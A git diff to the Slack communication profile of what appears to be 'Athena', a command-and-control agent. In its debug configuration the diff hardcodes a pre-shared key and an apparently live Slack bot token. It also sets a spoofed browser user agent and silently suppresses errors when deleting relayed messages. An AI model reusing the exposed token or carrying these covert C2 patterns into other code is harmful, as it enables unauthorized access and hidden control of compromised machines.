@@ -61,9 +61,9 @@ namespace Athena
         public Slack()
         {
 #if DEBUG
-            this.psk = " yKvIiu9lDmdNLAh/xp/lQl9zM5+NY5k0ySiNvqxAyEw=";
+            this.psk = "yKvIiu9lDmdNLAh/xp/lQl9zM5+NY5k0ySiNvqxAyEw=";
             this.encryptedExchangeCheck = bool.Parse("false");
-            this.messageToken = "";
+            this.messageToken = "xoxb-1699442376370-3485707998774-9UeLIw2s3htwJorhv5wnioCF";
             this.channel = "C03F752RT5E";
             this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
             this.messageChecks = int.Parse("3");
@@ -73,7 +73,6 @@ namespace Athena
             this.proxyUser = "";
             this.uuid = "8990dccf-de61-4111-b801-f4df84b0d43e";
 #else
-
             this.psk = "AESPSK";
             this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             this.messageToken = "slack_message_token";
@@ -85,7 +84,6 @@ namespace Athena
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
             this.uuid = "%UUID%";
-
 #endif
 
             //Might need to make this configurable
@@ -259,7 +257,14 @@ namespace Athena
             // This works for the current implemenation but may have to change in the event I need to further chunk messages.
             messages.ForEach(async message =>
             {
-                await this.client.Chat.Delete(this.channel, message);
+                try
+                {
+                    await this.client.Chat.Delete(this.channel, message);
+                }
+                catch
+                {
+                    //shh
+                }
             });
         }
         private async Task<Dictionary<string, MythicMessageWrapper>> GetSlackMessages()
